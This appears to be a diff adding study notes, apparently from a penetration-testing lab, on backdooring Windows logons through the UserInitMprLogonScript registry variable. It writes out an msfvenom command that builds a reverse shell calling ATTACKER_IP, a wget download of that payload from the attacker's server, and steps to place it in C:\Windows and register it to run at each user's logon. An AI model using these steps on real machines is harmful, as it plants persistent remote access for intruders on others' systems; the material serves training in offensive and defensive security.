@@ -1,0 +1,31 @@
+Logon scripts
+
+One of the things userinit.exe does while loading your user profile is to check for an environment variable called:
+    -UserInitMprLogonScript 
+
+We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. 
+The variable isn't set by default, so we can just create it and assign any script we like.
+
+Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.
+
+Let's first create a reverse shell to use for this technique:
+
+    -Kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
+
+We'll transfer the shell to our victim machine as we did previously.
+    Windows Powershell:
+        -wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+        
+We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
+
+Windows:
+    -C:\> move revshell.exe C:\Windows
+To create an environment variable for a user, you can go to its: "HKCU\Environment" in the registry.
+
+We will add the revershell to "UserInitMprLogonScript" entry to point to our payload so it gets loaded when the users logs in:
+
+Computer\HKEY_CURRENT_USER\Environment
+
+Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
